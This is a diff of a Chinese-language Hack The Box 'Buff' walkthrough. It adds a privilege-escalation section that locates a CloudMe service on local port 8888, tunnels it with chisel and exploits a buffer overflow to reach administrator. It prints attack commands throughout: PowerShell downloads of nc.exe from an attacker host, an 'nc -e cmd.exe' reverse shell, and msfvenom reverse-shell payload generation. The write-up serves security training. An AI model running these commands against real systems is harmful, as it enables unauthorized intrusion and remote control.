@@ -98,91 +98,7 @@ YouTube Demo - https://youtu.be/J_7G_AahgSw
 
 ```
 
-说是有一个sql文件，我们浏览器打开
-```
-──(root💀kali)-[/tmp/mozilla_root0]
-└─# cat table.sql 
--- phpMyAdmin SQL Dump
--- version 4.1.6
--- http://www.phpmyadmin.net
---
--- Host: 127.0.0.1
--- Generation Time: May 17, 2014 at 07:29 AM
--- Server version: 5.5.36
--- PHP Version: 5.4.25
-
-SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
-SET time_zone = "+00:00";
-
-
-/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
-/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
-/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
-/*!40101 SET NAMES utf8 */;
-
---
--- Database: `secure_login`
---
-
--- --------------------------------------------------------
-
---
--- Table structure for table `login_attempts`
---
-
-CREATE TABLE IF NOT EXISTS `login_attempts` (
-  `user_id` int(11) NOT NULL,
-  `time` varchar(30) NOT NULL
-) ENGINE=InnoDB DEFAULT CHARSET=latin1;
-
---
--- Dumping data for table `login_attempts`
---
-
-INSERT INTO `login_attempts` (`user_id`, `time`) VALUES
-(2, '1394950310'),
-(2, '1395431162'),
-(2, '1395432481'),
-(2, '1395432607'),
-(3, '1395432637'),
-(2, '1395513130');
-
--- --------------------------------------------------------
-
---
--- Table structure for table `members`
---
-
-CREATE TABLE IF NOT EXISTS `members` (
-  `id` int(11) NOT NULL AUTO_INCREMENT,
-  `username` varchar(30) NOT NULL,
-  `email` varchar(50) NOT NULL,
-  `password` char(128) NOT NULL,
-  `salt` char(128) NOT NULL,
-  `admin` int(11) NOT NULL DEFAULT '0',
-  `days` varchar(220) DEFAULT '0',
-  `present` varchar(220) DEFAULT '0',
-  `absent` varchar(220) DEFAULT '0',
-  `pect` varchar(220) DEFAULT '0',
-  `pic` int(11) DEFAULT '0',
-  `picName` mediumtext,
-  `paid` int(11) DEFAULT '0',
-  PRIMARY KEY (`id`)
-) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=9 ;
-
---
--- Dumping data for table `members`
---
-
-
-
-/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
-/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
-/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
-
-```
-
-可惜没有暴露出密码，不过我们至少知道了表结构和字段
+说是有一个sql文件，我们浏览器打开```table.sql```，下载到本地。没有暴露出密码，不过我们至少知道了表结构和字段
 
 
 /cgi-bin/printenv.pl暴露了一些配置信息
@@ -249,9 +165,9 @@ buff\shaun
 # 提权
 这个exp的shell非常难用，我们传两个实用工具到靶机，开一个趁手的shell
 
-> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.15:8000/wget.exe','C:\xampp\htdocs\gym\upload\wget.exe')"
+> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.15:8000/nc.exe','C:\xampp\htdocs\gym\upload\nc.exe')
 
-> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.15:8000/wget.exe','C:\xampp\htdocs\gym\upload\wget.exe')"
+> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.15:8000/wget.exe','C:\xampp\htdocs\gym\upload\wget.exe')
 
 靶机运行：
 > nc.exe 10.10.14.15 4242 -e cmd.exe
@@ -273,15 +189,158 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 PS C:\xampp\htdocs\gym\upload> 
 
 ```
+# 提权
+
+查看所有正在监听的网络连接
+```
+C:\xampp\htdocs\gym\upload>netstat -ano | findstr "LISTENING"
+netstat -ano | findstr "LISTENING"
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       948
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       6012
+  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       5200
+  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       7228
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       524
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1136
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1640
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2212
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       672
+  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       688
+  TCP    10.10.10.198:139       0.0.0.0:0              LISTENING       4
+  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       2824
+  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       2356
+  TCP    [::]:135               [::]:0                 LISTENING       948
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:7680              [::]:0                 LISTENING       5200
+  TCP    [::]:8080              [::]:0                 LISTENING       7228
+  TCP    [::]:49664             [::]:0                 LISTENING       524
+  TCP    [::]:49665             [::]:0                 LISTENING       1136
+  TCP    [::]:49666             [::]:0                 LISTENING       1640
+  TCP    [::]:49667             [::]:0                 LISTENING       2212
+  TCP    [::]:49668             [::]:0                 LISTENING       672
+  TCP    [::]:49669             [::]:0                 LISTENING       688
 
 
-wget.exe http://10.10.14.15:8000/shell_64.exe -o  ./shell_64.exe
+```
+
+可以看见有两个端口只监听了本地连接，分别是3306数据库还有一个 未知的8888端口服务。
+数据库只允许本地连接很正常，多数是为了安全考虑。
+这个8888端口服务有时候枚举不出来，我用winpea没有发现，找了半天。。。手动枚举有时候也会不出来
+
+记住8888端口的PID是：2356
+
+这个服务的PID每隔一段时间就会变，非常坑爹
+
+根据PID找二进制文件，我们使用下面命令：
+
+> tasklist /v | findstr 2356
 
 
-Import-Module .\PowerUp.ps1
+最后定位到是一个叫```CloudMe```的程序
+```
+c:\Users\shaun\Downloads>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A22D-49F7
 
-C:\xampp\htdocs\gym\upload\winPEAS.bat 
+ Directory of c:\Users\shaun\Downloads
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f exe > shell.exe
+14/07/2020  12:27    <DIR>          .
+14/07/2020  12:27    <DIR>          ..
+16/06/2020  15:26        17,830,824 CloudMe_1112.exe
+               1 File(s)     17,830,824 bytes
+               2 Dir(s)   7,572,029,440 bytes free
 
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f exe > shell_64.exe
+```
+
+在kali上搜索这个程序的漏洞情况
+```
+┌──(root💀kali)-[~/htb/buff]
+└─# searchsploit CloudMe      
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+CloudMe 1.11.2 - Buffer Overflow (PoC)                                                                                                                                                                    | windows/remote/48389.py
+CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                                                                                                                                           | windows/local/48499.txt
+CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                                                                                                                                                           | windows/local/48840.py
+Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                                                                                                                                          | windows_x86-64/remote/45197.rb
+CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                                                                                                                                                   | windows_x86-64/local/45159.py
+CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                                                                                                                                            | windows/remote/44175.rb
+CloudMe Sync 1.11.0 - Local Buffer Overflow                                                                                                                                                               | windows/local/44470.py
+CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                                                                                                                                           | windows/remote/46218.py
+CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                                                                                                                                                  | windows_x86-64/remote/46250.py
+CloudMe Sync < 1.11.0 - Buffer Overflow                                                                                                                                                                   | windows/remote/44027.py
+CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                                                                                                                                                | windows_x86-64/remote/44784.py
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+```
+
+我们把48389.py拷贝到当前目录
+
+然而不幸的是靶机的环境并没有安装python，因此得另寻办法。
+
+## 隧道
+
+我们用[chisel](https://github.com/jpillora/chisel/releases)在靶机和攻击机之间建立一条隧道
+
+在github上下载靶机使用的exe文件，以及kali使用的bash文件
+
+
+靶机从kali下载chisel.exe
+```
+c:\xampp\htdocs\gym\upload>wget http://10.10.14.15:8000/chisel.exe
+wget http://10.10.14.15:8000/chisel.exe
+--10:54:21--  http://10.10.14.15:8000/chisel.exe
+           => `chisel.exe'
+Connecting to 10.10.14.15:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+10:54:28 (1.20 MB/s) - `chisel.exe' saved [8548352/8548352]
+
+```
+
+kali服务端开启监听
+> ./chisel server -p 8000 --reverse
+
+windows客户端连接：
+> .\chisel.exe client 10.10.14.15:8000 R:8888:localhost:8888
+
+
+在kali上已经看到转发的8888端口服务：
+```
+┌──(root💀kali)-[~/htb/buff]
+└─# netstat -ano |grep 8888
+tcp6       0      0 :::8888                 :::*                    LISTEN      off (0.00/0/0)
+```
+
+我们用以下payload生成bof的字节码
+
+> msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -b '\x00\x0A\x0D' -f python 
+
+更新到48389.py的payload里
+
+在kali开启一个监听：
+> nc -lnvp 443
+
+在kali执行
+```
+┌──(root💀kali)-[~/htb/buff]
+└─# python3 48389.py    
+```
+
+
+收到靶机的反弹shell，已经是administrator权限
+```
+┌──(root💀kali)-[~/htb/buff]
+└─# nc -lnvp 443                
+listening on [any] 443 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.10.198] 49686
+Microsoft Windows [Version 10.0.17134.1610]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+buff\administrator
+
+C:\Windows\system32>
+```
